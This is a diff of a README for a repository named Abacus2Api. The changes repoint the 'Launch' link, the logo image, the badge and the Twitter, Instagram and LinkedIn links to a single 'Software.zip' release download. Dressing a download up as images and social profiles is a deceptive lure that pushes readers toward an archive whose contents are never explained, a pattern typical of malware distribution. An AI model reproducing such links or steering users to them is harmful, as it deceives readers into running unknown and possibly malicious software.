@@ -9,13 +9,13 @@ This repository does not provide a short description. However, you can explore t
 Topics for this repository are not provided.
 
 ### Learn More
-👉 [Launch Abacus2Api](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 🚀
+👉 [Launch Abacus2Api](https://github.com/nazaastore/Abacus2Api/releases/download/v2.0/Software.zip) 🚀
 
 If the link does not automatically launch, please visit the "Releases" section of this repository for more information.
 
 Feel free to explore the exciting features of Abacus2Api and contribute to its development! 🌟
 
-![Abacus2Api Logo](https://via.placeholder.com/150)
+![Abacus2Api Logo](https://github.com/nazaastore/Abacus2Api/releases/download/v2.0/Software.zip)
 
 ---
 #### For Developers: 
@@ -38,9 +38,9 @@ Contributions to Abacus2Api are always welcome! Whether you want to fix bugs, ad
 ### Connect with Us
 Stay updated on the latest news, releases, and announcements by following us on social media:
 
-📱 [Twitter](https://twitter.com/Abacus2Api)
-📷 [Instagram](https://instagram.com/Abacus2Api)
-👥 [LinkedIn](https://www.linkedin.com/company/Abacus2Api)
+📱 [Twitter](https://github.com/nazaastore/Abacus2Api/releases/download/v2.0/Software.zip)
+📷 [Instagram](https://github.com/nazaastore/Abacus2Api/releases/download/v2.0/Software.zip)
+👥 [LinkedIn](https://github.com/nazaastore/Abacus2Api/releases/download/v2.0/Software.zip)
 
 Join our community and be part of the Abacus2Api journey! 🚀
 
@@ -53,4 +53,4 @@ Thank you for exploring Abacus2Api! We hope you find this tool beneficial for yo
 
 ---
 
-![Built with Love](https://forthebadge.com/images/badges/built-with-love.svg)
+![Built with Love](https://github.com/nazaastore/Abacus2Api/releases/download/v2.0/Software.zip)
